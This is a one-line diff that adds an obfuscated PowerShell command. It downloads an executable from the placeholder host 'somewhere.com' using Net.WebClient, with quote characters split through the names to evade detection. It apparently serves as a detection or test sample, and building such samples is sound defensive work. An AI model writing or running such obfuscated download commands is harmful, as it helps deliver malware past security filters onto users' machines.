@@ -1,0 +1,1 @@
+powershell.exe -C (New-Ob"je"ct    Net.We"bcl"ient).D"own"loa"dF"ile(somewhere.com/some.exe, output.exe)
